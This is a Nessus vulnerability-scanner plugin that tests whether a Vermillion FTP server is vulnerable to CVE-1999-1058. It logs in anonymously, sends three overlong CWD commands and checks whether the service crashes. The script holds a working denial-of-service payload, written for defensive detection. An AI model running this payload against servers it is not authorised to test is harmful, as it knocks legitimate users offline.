#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10293);
 script_bugtraq_id(818);
 script_osvdb_id(9834);
 script_version ("$Revision: 1.34 $");
 script_cve_id("CVE-1999-1058");
 
 script_name(english:"Vermillion FTPD Long CWD Commands DoS");
	     
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a
denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote FTP server crash
by issuing the commands :

	CWD <buffer>
	CWD <buffer>
	CWD <buffer>

Where <buffer> is longer than 504 chars.	

An attacker can use this problem to prevent your FTP server
from working properly, thus preventing legitimate
users from using it." );
 script_set_attribute(attribute:"solution", value:
"upgrade your FTP to the latest version, 
or change it." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
		 
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/11/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/11/22");
 script_cvs_date("$Date: 2016/05/09 15:53:03 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

		    
 
 script_summary(english:"Checks if the remote ftp can be buffer overflown");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
		  
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here : 
#

include("global_settings.inc");
include('misc_func.inc');
include('ftp_func.inc');

login = get_kb_item_or_exit("ftp/login");
pass  = get_kb_item("ftp/password");

port = get_ftp_port(default: 21);

banner = get_ftp_banner(port:port);
if ( ! banner || "vftp" >!< tolower(banner)) exit(0);
# Connect to the FTP server
soc = open_sock_tcp(port);
if (! soc) exit(1);

 domain = ereg_replace(pattern:"[^\.]*\.(.*)",
 		       string:get_host_name(),
		       replace:"\1");	
		       
if(! ftp_authenticate(socket:soc, user:"anonymous", pass:string("nessus@", domain)))
  exit(1);

  crp = crap(504);
  c = strcat('CWD ', crp, '\r\n');
  send(socket:soc, data:c) x 3;
  close(soc);
if (service_is_dead(port: port)  > 0)
  security_warning(port);
